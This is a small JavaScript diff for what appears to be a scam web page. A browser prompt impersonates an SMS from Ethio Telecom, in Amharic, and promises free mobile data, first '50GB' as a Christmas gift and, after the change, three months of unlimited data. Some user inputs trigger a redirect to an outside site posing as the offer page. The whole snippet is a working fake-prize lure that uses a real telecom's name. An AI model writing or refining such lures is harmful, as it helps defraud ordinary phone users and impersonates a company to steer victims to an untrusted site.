@@ -1,6 +1,6 @@
 
-var password = '50GB አግብር'
-password=prompt('SMS: እንኳን ደስ አለህ ለኢትዮ ቴሌኮም 50GB የገና ጊፈር ብቁ ናችሁ።50GB አሁኑኑ ለማግበር እሺን ተጫኑ።   ','50GB አግብር');
-if (password != '50GB አግብር') {
+var password = 'ያልተገደበ ውሂብን አግብር'
+password=prompt('SMS: እንኳን ደስ ያለህ ለኢትዮ ቴሌኮም የ3-ወር ያልተገደበ ነፃ ዳታ ብቁ ናችሁ።አሁን ለማግበር እሺን ተጫኑት።   ','ያልተገደበ ውሂብን አግብር');
+if (password != 'ያልተገደበ ውሂብን አግብር') {
 location.href='https://get-offre.org/ethio-tele.html';
 }
